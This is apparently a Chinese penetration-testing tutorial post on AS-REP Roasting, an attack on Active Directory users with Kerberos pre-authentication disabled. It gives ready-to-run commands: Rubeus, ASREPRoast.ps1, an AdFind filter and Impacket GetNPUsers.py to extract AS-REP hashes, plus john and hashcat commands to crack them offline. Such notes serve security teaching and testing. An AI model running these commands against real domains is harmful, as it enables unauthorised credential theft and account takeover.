---
title: 攻击方式 - AS-REP Roasting
date: 2026-08-28 15:00:00
categories:
  - 渗透测试
tags:
  - AS-REP Roasting
  - Kerberos
  - 域渗透
description: 针对关闭 Kerberos 预认证域用户的离线密码攻击
---

定义：AS-REPRoasting是一种针对启用"不要要求Kerberos预认证"选项的域用户的离线密码攻击

### 攻击条件：
1. Kerberos预身份认证关闭
2. 不需要域管理员权限，普通域用户甚至匿名即可枚举  
3. 已知目标账户的用户名 
4. 攻击者网络可达域控（KDC），能与 **88 端口**通信  

### 实战场景：
在域环境里，拿到普通访问权限后，找"不需要预认证"的账号，请求票据并离线爆破密码。  

AS-REP Roasting 攻击的目标是「用户账户」，不是「机器」  

### 攻击过程：
#### 获取hash
（获取AS-REP响应包中用户hash加密的Login Session Key）

##### 工具1：Rubeus
```bash
Rubeus.exe asreproast /format:john /outfile:hash.txt //域内机器版（已加域，当前用户有权限）

Rubeus.exe asreproast /domain:域名 /dc:域控IP /user:用户名 /password:密码 /format:john /outfile:hash.txt         //远程攻击
```

将提取到的hash保存为hash.txt

##### 工具2：ASREPRoast.ps1脚本 (域内PowerShell)
```bash
Import-Module .\ASREPRoast.ps1

Invoke-ASREPRoast | select -ExpandProperty Hash | Out-File hash.txt
```

##### Adfind+GetNPUsers.py—拿到的是非域内机器
前提：有一个有效的域账户和密码

用Adfind查询**域内**查询Kerberos预身份认证关闭的用户

```plain
adfind -h 域控IP -u 域名\用户名 -up 密码 -f "useraccountcontrol:1.2.840.113556.1.4.803:=4194304" samaccountname
```

上一步过滤出来的域账户写入user.txt文件（或者直接用用户名本爆破）

查到这些用户名后，用 Impacket 的 `GetNPUsers.py` 直接拿 Hash  （**在kali**）

```plain
python GetNPUsers.py 域名/ -usersfile users.txt -format hashcat -outputfile hash.txt
```

或者单用户名

```plain
python GetNPUsers.py 域名/用户名:密码 -request -format john -outputfile hash.txt
```

#### 爆破hash
 默认导出都是hashcat格式，除非手动改 / 加 `/format:john`

##### john爆破：
```plain
# 最常用：rockyou 字典爆破
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# 查看已破解的结果
john --show hash.txt
```

##### hashcat爆破：
```plain
hashcat -m 18200 hash.txt rockyou.txt
```



>  AS-REP Roasting 的 hash，hashcat 用 `-m 18200`，Kerberoasting 的用 `-m 13100`，别搞混了  
>
